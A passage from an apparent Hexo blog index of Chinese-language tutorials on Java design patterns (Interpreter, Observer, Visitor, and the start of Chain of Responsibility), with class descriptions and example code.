<h3 id="PrimitiveCommandNode"><a href="#PrimitiveCommandNode" class="headerlink" title="PrimitiveCommandNode"></a>PrimitiveCommandNode</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;primitive command&gt; ::= go | right | left</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimitiveCommandNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(Context context)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        name = context.currentToken();</span><br><span class="line">        context.skipToken(name);</span><br><span class="line">        <span class="keyword">if</span> (!name.equals(<span class="string">"go"</span>) &amp;&amp; !name.equals(<span class="string">"right"</span>) &amp;&amp; !name.equals(<span class="string">"left"</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ParseException(name + <span class="string">" is undefined"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ProgramNode"><a href="#ProgramNode" class="headerlink" title="ProgramNode"></a>ProgramNode</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;program&gt; ::= program &lt;command list&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProgramNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Node commandListNode;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(Context context)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        context.skipToken(<span class="string">"program"</span>);</span><br><span class="line">        commandListNode = <span class="keyword">new</span> CommandListNode();</span><br><span class="line">        commandListNode.parse(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[program "</span> + commandListNode + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RepeatCommandNode"><a href="#RepeatCommandNode" class="headerlink" title="RepeatCommandNode"></a>RepeatCommandNode</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;repeat command&gt; ::= repeat &lt;number&gt; &lt;command list&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RepeatCommandNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">private</span> Node commandListNode;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(Context context)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        context.skipToken(<span class="string">"repeat"</span>);</span><br><span class="line">        number = context.currentNumber();</span><br><span class="line">        context.nextToken();</span><br><span class="line">        commandListNode = <span class="keyword">new</span> CommandListNode();</span><br><span class="line">        commandListNode.parse(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[repeat "</span> + number + <span class="string">" "</span> + commandListNode + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">"program.txt"</span>));</span><br><span class="line">            String text;</span><br><span class="line">            <span class="keyword">while</span> ((text = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"text = \""</span> + text + <span class="string">"\""</span>);</span><br><span class="line">                Node node = <span class="keyword">new</span> ProgramNode();</span><br><span class="line">                node.parse(<span class="keyword">new</span> Context(text));</span><br><span class="line">                System.out.println(<span class="string">"node = "</span> + node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="program-txt"><a href="#program-txt" class="headerlink" title="program.txt"></a>program.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">program end</span><br><span class="line">program go end</span><br><span class="line">program go right go right go right go right end</span><br><span class="line">program repeat 4 go right end end</span><br><span class="line">program repeat 4 repeat 3 go right go left end right end end</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>解释器模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-观察者模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-observer1.png" alt="观察者模式类图"></p>
<h3 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h3><p>表示观察对象。定义了注册观察者和删除观察者的方法。此外，还声明了“获取现在状态”的方法。</p>
<h3 id="ConcreteSubject"><a href="#ConcreteSubject" class="headerlink" title="ConcreteSubject"></a>ConcreteSubject</h3><p>表示具体的被观察对象。当自身状态发生变化后，它会通知所有已经注册的Observer角色</p>
<h3 id="Observer（观察者）"><a href="#Observer（观察者）" class="headerlink" title="Observer（观察者）"></a>Observer（观察者）</h3><p>负责接收来自Subject的状态变化通知。为此，它声明了update方法</p>
<h3 id="ConcreteObserver（具体的观察者）"><a href="#ConcreteObserver（具体的观察者）" class="headerlink" title="ConcreteObserver（具体的观察者）"></a>ConcreteObserver（具体的观察者）</h3><p>表示具体的Observer。当他的update方法被调用后，会去获取要观察的对象的最新的状态。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-observer2.png" alt="观察者模式示例类图"></p>
<h3 id="DigitObserver"><a href="#DigitObserver" class="headerlink" title="DigitObserver"></a>DigitObserver</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DigitObserver</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(NumberGenerator generator)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"DigitObserver:"</span> + generator.getNumber());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GraphObserver"><a href="#GraphObserver" class="headerlink" title="GraphObserver"></a>GraphObserver</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphObserver</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(NumberGenerator generator)</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"GraphObserver:"</span>);</span><br><span class="line">        <span class="keyword">int</span> count = generator.getNumber();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            System.out.print(<span class="string">"*"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="NumberGenerator"><a href="#NumberGenerator" class="headerlink" title="NumberGenerator"></a>NumberGenerator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">NumberGenerator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ArrayList observers = <span class="keyword">new</span> ArrayList();        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addObserver</span><span class="params">(Observer observer)</span> </span>&#123;    </span><br><span class="line">        observers.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteObserver</span><span class="params">(Observer observer)</span> </span>&#123; </span><br><span class="line">        observers.remove(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notifyObservers</span><span class="params">()</span> </span>&#123;               </span><br><span class="line">        Iterator it = observers.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            Observer o = (Observer)it.next();</span><br><span class="line">            o.update(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">getNumber</span><span class="params">()</span></span>;                </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span></span>;                 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Observer"><a href="#Observer" class="headerlink" title="Observer"></a>Observer</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public interface Observer &#123;</span><br><span class="line">    public abstract void update(NumberGenerator generator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RandomNumberGenerator"><a href="#RandomNumberGenerator" class="headerlink" title="RandomNumberGenerator"></a>RandomNumberGenerator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RandomNumberGenerator</span> <span class="keyword">extends</span> <span class="title">NumberGenerator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();   </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> number;                     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNumber</span><span class="params">()</span> </span>&#123;                </span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            number = random.nextInt(<span class="number">50</span>);</span><br><span class="line">            notifyObservers();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        NumberGenerator generator = <span class="keyword">new</span> RandomNumberGenerator();</span><br><span class="line">        Observer observer1 = <span class="keyword">new</span> DigitObserver();</span><br><span class="line">        Observer observer2 = <span class="keyword">new</span> GraphObserver();</span><br><span class="line">        generator.addObserver(observer1);</span><br><span class="line">        generator.addObserver(observer2);</span><br><span class="line">        generator.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>观察者模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-访问者模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。通过这种方式，元素的执行算法可以随着访问者改变而改变。根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-visitor1.png" alt="访问者模式类图"></p>
<h3 id="Visitor"><a href="#Visitor" class="headerlink" title="Visitor"></a>Visitor</h3><p>负责对数据结构中每个具体的元素声明一个用于访问XXX的visit(XXX)方法。visit(XXX)是用于处理XXX的方法，负责实现该方法的是ConcreteVisitor。</p>
<h3 id="ConcreteVisitor"><a href="#ConcreteVisitor" class="headerlink" title="ConcreteVisitor"></a>ConcreteVisitor</h3><p>负责实现Visitor所定义的接口。它要实现所有的visit(XXX)方法，即实现如何处理每个ConcreteElement</p>
<h3 id="Element（元素）"><a href="#Element（元素）" class="headerlink" title="Element（元素）"></a>Element（元素）</h3><p>表示Visitor角色的访问对象。它声明了接受访问者的accept方法。accept方法接收到的参数是Visitor。</p>
<h3 id="ObjectStructure"><a href="#ObjectStructure" class="headerlink" title="ObjectStructure"></a>ObjectStructure</h3><p>负责处理Element的集合。ConcreteVisitor为每个Element都准备了处理方法。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-visitor2.png" alt="装饰器模式示例类图"></p>
<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Directory</span> <span class="keyword">extends</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;                    </span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Entry&gt; dir = <span class="keyword">new</span> ArrayList&lt;&gt;();      </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Directory</span><span class="params">(String name)</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;               </span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span> </span>&#123;                  </span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">        Iterator&lt;Entry&gt; it = dir.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            Entry entry = (Entry)it.next();</span><br><span class="line">            size += entry.getSize();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Entry <span class="title">add</span><span class="params">(Entry entry)</span> </span>&#123;         </span><br><span class="line">        dir.add(entry);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;Entry&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">return</span> dir.iterator();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor v)</span> </span>&#123;         </span><br><span class="line">        v.visit(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Element"><a href="#Element" class="headerlink" title="Element"></a>Element</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor v)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Entry"><a href="#Entry" class="headerlink" title="Entry"></a>Entry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> <span class="keyword">implements</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getName</span><span class="params">()</span></span>;                                   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;                                      </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Entry <span class="title">add</span><span class="params">(Entry entry)</span> <span class="keyword">throws</span> FileTreatmentException </span>&#123;       </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FileTreatmentException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;Entry&gt; <span class="title">iterator</span><span class="params">()</span> <span class="keyword">throws</span> FileTreatmentException </span>&#123;    </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FileTreatmentException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;                                          </span><br><span class="line">        <span class="keyword">return</span> getName() + <span class="string">" ("</span> + getSize() + <span class="string">")"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">File</span><span class="params">(String name, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.size = size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor v)</span> </span>&#123;</span><br><span class="line">        v.visit(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FileTreatmentException"><a href="#FileTreatmentException" class="headerlink" title="FileTreatmentException"></a>FileTreatmentException</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileTreatmentException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileTreatmentException</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileTreatmentException</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ListVisitor"><a href="#ListVisitor" class="headerlink" title="ListVisitor"></a>ListVisitor</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListVisitor</span> <span class="keyword">extends</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String currentdir = <span class="string">""</span>;                         </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(File file)</span> </span>&#123;                  </span><br><span class="line">        System.out.println(currentdir + <span class="string">"/"</span> + file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(Directory directory)</span> </span>&#123;   </span><br><span class="line">        System.out.println(currentdir + <span class="string">"/"</span> + directory);</span><br><span class="line">        String savedir = currentdir;</span><br><span class="line">        currentdir = currentdir + <span class="string">"/"</span> + directory.getName();</span><br><span class="line">        Iterator&lt;Entry&gt; it = directory.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            Entry entry = (Entry)it.next();</span><br><span class="line">            entry.accept(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        currentdir = savedir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Visitor-1"><a href="#Visitor-1" class="headerlink" title="Visitor"></a>Visitor</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(File file)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(Directory directory)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Making root entries..."</span>);</span><br><span class="line">            Directory rootdir = <span class="keyword">new</span> Directory(<span class="string">"root"</span>);</span><br><span class="line">            Directory bindir = <span class="keyword">new</span> Directory(<span class="string">"bin"</span>);</span><br><span class="line">            Directory tmpdir = <span class="keyword">new</span> Directory(<span class="string">"tmp"</span>);</span><br><span class="line">            Directory usrdir = <span class="keyword">new</span> Directory(<span class="string">"usr"</span>);</span><br><span class="line">            rootdir.add(bindir);</span><br><span class="line">            rootdir.add(tmpdir);</span><br><span class="line">            rootdir.add(usrdir);</span><br><span class="line">            bindir.add(<span class="keyword">new</span> File(<span class="string">"vi"</span>, <span class="number">10000</span>));</span><br><span class="line">            bindir.add(<span class="keyword">new</span> File(<span class="string">"latex"</span>, <span class="number">20000</span>));</span><br><span class="line">            rootdir.accept(<span class="keyword">new</span> ListVisitor());              </span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line">            System.out.println(<span class="string">"Making user entries..."</span>);</span><br><span class="line">            Directory yuki = <span class="keyword">new</span> Directory(<span class="string">"yuki"</span>);</span><br><span class="line">            Directory hanako = <span class="keyword">new</span> Directory(<span class="string">"hanako"</span>);</span><br><span class="line">            Directory tomura = <span class="keyword">new</span> Directory(<span class="string">"tomura"</span>);</span><br><span class="line">            usrdir.add(yuki);</span><br><span class="line">            usrdir.add(hanako);</span><br><span class="line">            usrdir.add(tomura);</span><br><span class="line">            yuki.add(<span class="keyword">new</span> File(<span class="string">"diary.html"</span>, <span class="number">100</span>));</span><br><span class="line">            yuki.add(<span class="keyword">new</span> File(<span class="string">"Composite.java"</span>, <span class="number">200</span>));</span><br><span class="line">            hanako.add(<span class="keyword">new</span> File(<span class="string">"memo.tex"</span>, <span class="number">300</span>));</span><br><span class="line">            tomura.add(<span class="keyword">new</span> File(<span class="string">"game.doc"</span>, <span class="number">400</span>));</span><br><span class="line">            tomura.add(<span class="keyword">new</span> File(<span class="string">"junk.mail"</span>, <span class="number">500</span>));</span><br><span class="line">            rootdir.accept(<span class="keyword">new</span> ListVisitor());              </span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileTreatmentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Visitor模式的目的是<strong>将处理从数据结构中分离出来</strong>。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>访问者模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-责任链模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。</p>
<p>在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-chainofresponsibility1.png" alt="责任链模式类图"></p>
<h3 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h3><p>定义了处理请求的接口。它知道下一个“处理者”是谁，如果自己无法处理请求，它会将请求转给“下一个处理者”，当然，“下一个”处理者也是Handler角色。</p>
<h3 id="ConcreteHandler"><a href="#ConcreteHandler" class="headerlink" title="ConcreteHandler"></a>ConcreteHandler</h3><p>是处理具体请求的角色。</p>
<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p>是想第一个ConcreteHandler发送请求的角色。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-chainofresponsibility2.png" alt="责任链模式示例类图"></p>
